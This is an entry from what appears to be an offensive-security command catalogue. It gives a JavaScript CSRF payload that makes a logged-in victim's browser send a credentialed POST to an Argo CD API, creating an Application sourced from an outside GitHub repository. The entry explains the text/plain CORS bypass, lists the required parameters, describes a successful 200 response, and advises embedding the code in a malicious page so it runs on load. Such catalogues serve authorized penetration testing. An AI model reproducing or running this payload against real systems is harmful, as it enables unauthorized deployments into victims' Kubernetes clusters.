---
id: uuid7
data: >-
  var xhr = new XMLHttpRequest(); xhr.open('POST',
  'https://argocd.internal.victim.com/api/v1/applications');
  xhr.setRequestHeader('Content-Type', 'text/plain'); xhr.withCredentials =
  true;
  xhr.send('{"apiVersion":"argoproj.io/v1alpha1","kind":"Application","metadata":{"name":"test-app1"},"spec":{"destination":{"name":"","namespace":"default","server":"https://kubernetes.default.svc"},"source":{"path":"argotest1","repoURL":"https://github.com/califio/argotest1","targetRevision":"HEAD"},"sources":[],"project":"default","syncPolicy":{"automated":{"prune":false,"selfHeal":false}}}}');
tags:
  - csrf
  - javascript
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:50.213Z'
verified: false
validated: true
submitted: true
---
# csrf-post-application-creation

## Command

```javascript
var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://argocd.internal.victim.com/api/v1/applications'); xhr.setRequestHeader('Content-Type', 'text/plain'); xhr.withCredentials = true; xhr.send('{"apiVersion":"argoproj.io/v1alpha1","kind":"Application","metadata":{"name":"test-app1"},"spec":{"destination":{"name":"","namespace":"default","server":"https://kubernetes.default.svc"},"source":{"path":"argotest1","repoURL":"https://github.com/califio/argotest1","targetRevision":"HEAD"},"sources":[],"project":"default","syncPolicy":{"automated":{"prune":false,"selfHeal":false}}}}');
```

## Description

This JavaScript command sends a CSRF POST request to create a malicious Argo CD Application, bypassing CORS with text/plain Content-Type and including auth cookies.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| url | Target Argo CD API endpoint | Yes |
| Content-Type | Set to text/plain for bypass | Yes |
| withCredentials | true to include cookies | Yes |
| payload | JSON for Application resource | Yes |

## Examples

### Basic Usage

```javascript
var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://target/api/v1/applications'); xhr.setRequestHeader('Content-Type', 'text/plain'); xhr.withCredentials = true; xhr.send('{"apiVersion":"argoproj.io/v1alpha1","kind":"Application",...}');
```

### Advanced Usage

Embed in <script> tag on malicious page for auto-execution.

## Expected Output

HTTP 200 OK from Argo CD, application created and queued for sync.

## Related

- [[procedures/Inject-Malicious-JavaScript-for-CSRF-Exploitation]]
